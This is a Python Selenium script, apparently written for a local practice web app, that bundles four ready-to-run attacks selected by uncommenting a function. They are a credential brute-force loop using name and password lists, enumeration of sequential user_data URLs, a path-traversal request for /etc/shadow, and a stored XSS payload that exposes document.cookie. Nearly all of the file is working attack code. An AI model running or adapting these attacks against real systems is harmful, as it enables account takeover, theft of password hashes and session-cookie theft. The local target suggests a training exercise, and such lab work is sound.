#!/usr/bin/python3
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from pyvirtualdisplay import Display
import re
import requests

def guess_password(driver):
    
    with open("names.txt", "r") as f:
            names = f.read()

    print(names)
    names = names.split("\n")
    print(names)

    usernames = []

    for name in names:
        usernames.append(name.replace(" ", "."))

    with open("dictionary.txt") as f:
        passwords = f.read()

    passwords = passwords.split("\n")
    print(passwords)

    for user in usernames:
        for password in passwords:

            print("Trying Username: {} with Password: {}".format(user, password))

            elem = driver.find_element_by_name("username")
            elem.send_keys(user)

            elem = driver.find_element_by_name("password")
            elem.send_keys(password)

            elem.send_keys(Keys.RETURN)

            src = driver.page_source

            login_err_found = re.search(r'Wrong username', src)
            if login_err_found is None:
                print("Found the password!  Username: {} with Password: {}".format(user, password))
                return src

    return "Not found"


def brute_force_login(driver):

    driver.get("http://127.0.0.1:5000/")

    page_text = guess_password(driver)

    print(page_text)


def sess_pred(driver):

    run = True
    base = "http://127.0.0.1:5000/"

    counter = 0

    while run is True:
        counter += 1
        url = base + "user_data/user" + str(counter)
        print("\n Trying {}".format(url))
        driver.get(url)
        r = requests.get(url)
        print(r.status_code)
        if r.status_code != 200:
            run = False
        else:
            print(r.text)


def directory_transversal(driver):

    url = "http://127.0.0.1:5000/get_file/..%2f/etc/shadow"
    driver.get(url)
    r = requests.get(url)
    print(r.text)


def xss_attack(driver):
    driver.get("http://127.0.0.1:5000/blog")
    elem = driver.find_element_by_name("post")
    elem.send_keys("<script>document.write(document.cookie);</script>")
    elem.send_keys(Keys.RETURN)

    print(driver.page_source)



if __name__ == '__main__':
    
    display = Display(visible=0, size=(1024, 768))
    display.start()

    driver = webdriver.Firefox()

    ## Uncomment one of the functions below to run a specific hack

    #brute_force_login(driver)
    #sess_pred(driver)
    #directory_transversal(driver)
    #xss_attack(driver)

    driver.close()
    display.stop()
